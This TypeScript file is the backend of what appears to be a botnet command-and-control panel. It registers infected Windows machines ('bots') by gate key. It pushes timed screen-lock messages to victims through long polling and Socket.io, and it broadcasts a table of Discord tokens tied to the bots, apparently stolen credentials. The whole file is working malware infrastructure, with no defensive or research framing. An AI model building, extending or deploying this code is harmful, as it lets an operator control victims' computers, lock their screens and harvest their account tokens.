import express from 'express';
import http from 'http';
import cors from 'cors';
import { Server, Socket } from 'socket.io';
import dotenv from 'dotenv';

import { initDb, pool } from './db';
import authRoutes from './routes/auth';
import botsRoutes from './routes/bots';
import discordRoutes from './routes/discord';

dotenv.config();

const app = express();
app.set('trust proxy', 1);
const server = http.createServer(app);

app.use(cors());
app.use(express.json({ limit: '20mb' }));

interface AlertItem {
  title: string;
  message: string;
}

export interface LongPollClient {
  res: any;
  gateKey: string;
  pcName: string;
}

export const longPollConnections = new Map<string, LongPollClient>();

export const sendAlertToClients = async (alertData: {
  title?: string;
  message?: string;
  type?: string;
  duration?: number;
  targetPc?: string;
  path?: string;
}) => {
  const io = app.get('io');
  if (io) {
    io.emit('display_screen', alertData);
  }

  if (alertData.type === 'custom' && alertData.duration && alertData.duration > 0) {
    try {
      const targetPc = alertData.targetPc && alertData.targetPc.trim() !== '' ? alertData.targetPc.trim() : 'ALL';
      const lockUntilDate = new Date(Date.now() + alertData.duration);
      await pool.query(
        'INSERT INTO active_locks (pc_name, title, message, lock_until) VALUES ($1, $2, $3, $4)',
        [targetPc, alertData.title || '', alertData.message || '', lockUntilDate]
      );
    } catch (err) {
      console.error('Save active lock error:', err);
    }
  }

  const entries = Array.from(longPollConnections.entries());
  for (const [clientKey, client] of entries) {
    try {
      const targetStr = alertData.targetPc ? String(alertData.targetPc).trim().toLowerCase() : '';
      const clientPcStr = client.pcName ? String(client.pcName).trim().toLowerCase() : '';

      const isTargetAll = !targetStr || targetStr === '' || targetStr === 'all';
      const isTargetMatch = clientPcStr && (clientPcStr === targetStr || clientPcStr.includes(targetStr) || targetStr.includes(clientPcStr));

      if (isTargetAll || isTargetMatch) {
        client.res.json({
          title: alertData.title || '',
          message: alertData.message || '',
          type: alertData.type || 'custom',
          duration: alertData.duration || 0,
          targetPc: alertData.targetPc || 'ALL',
          path: alertData.path || ''
        });
        longPollConnections.delete(clientKey);
      }
    } catch (err) {
      longPollConnections.delete(clientKey);
    }
  }
};

app.post('/api/bots/ping', async (req, res) => {
  let { gateKey, pcName, ip, osInfo } = req.body;
  if (!gateKey) return res.status(400).json({ success: false, message: 'Missing key' });

  const reqIp = (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
  const cleanReqIp = reqIp.replace('::ffff:', '');
  if (!ip || ip === '127.0.0.1' || ip === 'localhost') {
    if (cleanReqIp && cleanReqIp !== '::1' && cleanReqIp !== '127.0.0.1') {
      ip = cleanReqIp;
    }
  }

  try {
    const userRes = await pool.query('SELECT * FROM users WHERE gate_key = $1', [gateKey]);
    if (userRes.rows.length === 0) return res.status(401).json({ success: false });

    const user = userRes.rows[0];
    const existing = await pool.query('SELECT * FROM bots WHERE user_id = $1 AND pc_name = $2', [user.id, pcName]);

    if (existing.rows.length > 0) {
      const b = existing.rows[0];
      let devKey = b.device_key;
      if (!devKey) {
        devKey = 'DEV-' + Math.random().toString(36).substring(2, 10).toUpperCase();
        await pool.query('UPDATE bots SET device_key = $1 WHERE id = $2', [devKey, b.id]);
      }
      await pool.query('UPDATE bots SET status = $1, last_seen = NOW(), ip = $2, os_info = $3 WHERE id = $4', ['online', ip || '127.0.0.1', osInfo, b.id]);
    } else {
      const devKey = 'DEV-' + Math.random().toString(36).substring(2, 10).toUpperCase();
      await pool.query('INSERT INTO bots (user_id, device_key, ip, pc_name, os_info, status) VALUES ($1, $2, $3, $4, $5, $6)', [user.id, devKey, ip || '127.0.0.1', pcName, osInfo, 'online']);
    }

    await broadcastBotsUpdate(user.id);
    return res.json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false });
  }
});

setInterval(async () => {
  try {
    const offlineResult = await pool.query(
      "UPDATE bots SET status = 'offline' WHERE status = 'online' AND last_seen < NOW() - INTERVAL '6 seconds' RETURNING user_id"
    );
    const affectedUserIds = new Set(offlineResult.rows.map(r => r.user_id));
    for (const uid of affectedUserIds) {
      await broadcastBotsUpdate(uid);
    }
  } catch (e) {}
}, 2000);

app.get('/api/bots/alerts', async (req, res) => {
  const { gateKey, pcName } = req.query;
  if (!gateKey || !pcName) return res.status(400).json({ success: false });

  try {
    const userCheck = await pool.query('SELECT id FROM users WHERE gate_key = $1', [String(gateKey)]);
    if (userCheck.rows.length === 0) {
      return res.status(401).json({ success: false, message: 'Invalid gate key' });
    }
  } catch (err) {
    return res.status(500).json({ success: false });
  }

  const targetPcName = String(pcName).trim();

  try {
    const activeLockQuery = await pool.query(
      "SELECT id, title, message, lock_until FROM active_locks WHERE (LOWER(pc_name) = LOWER($1) OR UPPER(pc_name) = 'ALL') AND lock_until > NOW() ORDER BY lock_until DESC LIMIT 1",
      [targetPcName]
    );

    if (activeLockQuery.rows.length > 0) {
      const lock = activeLockQuery.rows[0];
      const lockUntilMs = new Date(lock.lock_until).getTime();
      const nowMs = Date.now();
      const remainingMs = lockUntilMs - nowMs;

      if (remainingMs > 1000) {
        await pool.query('DELETE FROM active_locks WHERE id = $1', [lock.id]);

        return res.json({
          title: lock.title || '',
          message: lock.message || '',
          type: 'custom',
          duration: remainingMs,
          targetPc: targetPcName
        });
      } else {
        await pool.query('DELETE FROM active_locks WHERE id = $1', [lock.id]);
      }
    }
  } catch (err) {
    console.error('Active lock check error:', err);
  }

  const clientKey = `${gateKey}_@_${targetPcName}`;
  
  req.socket.setTimeout(35000);
  
  longPollConnections.set(clientKey, { res, gateKey: String(gateKey), pcName: targetPcName });

  req.on('close', () => {
    longPollConnections.delete(clientKey);
  });
});

app.use('/api/auth', authRoutes);
app.use('/api/bots', botsRoutes);
app.use('/api/discord', discordRoutes);

const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

app.set('io', io);

interface ClientRegister {
  gateKey: string;
  pcName: string;
  ip: string;
  osInfo?: string;
}

const socketBotMap = new Map<string, { botId: number; userId: number }>();

const lastBroadcastMap = new Map<number, number>();
const pendingBroadcastMap = new Map<number, NodeJS.Timeout>();

export const broadcastBotsUpdate = async (userId: number, immediate = false) => {
  if (immediate) {
    if (pendingBroadcastMap.has(userId)) {
      clearTimeout(pendingBroadcastMap.get(userId)!);
      pendingBroadcastMap.delete(userId);
    }
    try {
      const result = await pool.query(
        'SELECT * FROM bots WHERE user_id = $1 ORDER BY id ASC',
        [userId]
      );
      io.emit(`bots_update_${userId}`, result.rows);
      lastBroadcastMap.set(userId, Date.now());
    } catch (err) {
      console.error('Broadcast error:', err);
    }
    return;
  }

  const now = Date.now();
  const last = lastBroadcastMap.get(userId) || 0;
  if (now - last < 1000) {
    if (!pendingBroadcastMap.has(userId)) {
      const timeout = setTimeout(() => {
        pendingBroadcastMap.delete(userId);
        broadcastBotsUpdate(userId, true);
      }, 1000 - (now - last));
      pendingBroadcastMap.set(userId, timeout);
    }
    return;
  }

  try {
    const result = await pool.query(
      'SELECT * FROM bots WHERE user_id = $1 ORDER BY id ASC',
      [userId]
    );
    io.emit(`bots_update_${userId}`, result.rows);
    lastBroadcastMap.set(userId, Date.now());
  } catch (err) {
    console.error('Broadcast error:', err);
  }
};

export const broadcastDiscordTokensUpdate = async (userId: number) => {
  try {
    const result = await pool.query(
      `SELECT dt.* FROM discord_tokens dt 
       JOIN bots b ON dt.bot_id = b.id 
       WHERE b.user_id = $1 
       ORDER BY dt.created_at DESC`,
      [userId]
    );
    io.emit(`discord_tokens_update_${userId}`, result.rows);
    io.emit('discord_tokens_update', result.rows);
  } catch (err) {
    console.error('Broadcast discord tokens error:', err);
  }
};

io.on('connection', (socket: Socket) => {
  socket.on('register_client', async (data: ClientRegister) => {
    const { gateKey, pcName, ip, osInfo } = data;

    if (!gateKey) return;

    try {
      const userRes = await pool.query('SELECT * FROM users WHERE gate_key = $1', [gateKey]);
      if (userRes.rows.length === 0) {
        socket.emit('error_msg', 'Geçersiz Gate Key.');
        return;
      }

      const user = userRes.rows[0];

      const existingBot = await pool.query(
        'SELECT * FROM bots WHERE user_id = $1 AND ip = $2 AND pc_name = $3',
        [user.id, ip || '127.0.0.1', pcName || 'Windows PC']
      );

      let botId: number;

      if (existingBot.rows.length > 0) {
        botId = existingBot.rows[0].id;
        await pool.query(
          'UPDATE bots SET status = $1, last_seen = NOW(), os_info = $2 WHERE id = $3',
          ['online', osInfo || 'Windows 11', botId]
        );
      } else {
        const newBot = await pool.query(
          'INSERT INTO bots (user_id, ip, pc_name, os_info, status) VALUES ($1, $2, $3, $4, $5) RETURNING id',
          [user.id, ip || '127.0.0.1', pcName || 'Windows PC', osInfo || 'Windows 11', 'online']
        );
        botId = newBot.rows[0].id;
      }

      socketBotMap.set(socket.id, { botId, userId: user.id });
      await broadcastBotsUpdate(user.id);
    } catch (err) {
      console.error('Register client error:', err);
    }
  });

  socket.on('trigger_alert', async (alertData) => {
    await sendAlertToClients(alertData);
  });

  socket.on('disconnect', async () => {
    const info = socketBotMap.get(socket.id);
    if (info) {
      const { botId, userId } = info;
      await pool.query('UPDATE bots SET status = $1, last_seen = NOW() WHERE id = $2', ['offline', botId]);
      socketBotMap.delete(socket.id);
      await broadcastBotsUpdate(userId);
    }
  });
});

const PORT = process.env.PORT || 5000;

const startServerWithDbRetry = async (retries = 10, delay = 3000) => {
  for (let i = 1; i <= retries; i++) {
    try {
      await initDb();
      console.log('✅ Veritabanı bağlantısı ve tablolar oluşturuldu.');
      return;
    } catch (error) {
      console.error(`⚠️ Veritabanı henüz hazır değil (Deneme ${i}/${retries}). ${delay / 1000}s sonra tekrar deneniyor...`);
      await new Promise((res) => setTimeout(res, delay));
    }
  }
  console.error('❌ Veritabanına bağlanılamadı. Uygulama kapatılıyor.');
  process.exit(1);
};

server.listen(PORT, async () => {
  console.log(`🚀 Backend Sunucusu http://localhost:${PORT} portunda çalışıyor.`);
  await startServerWithDbRetry();
});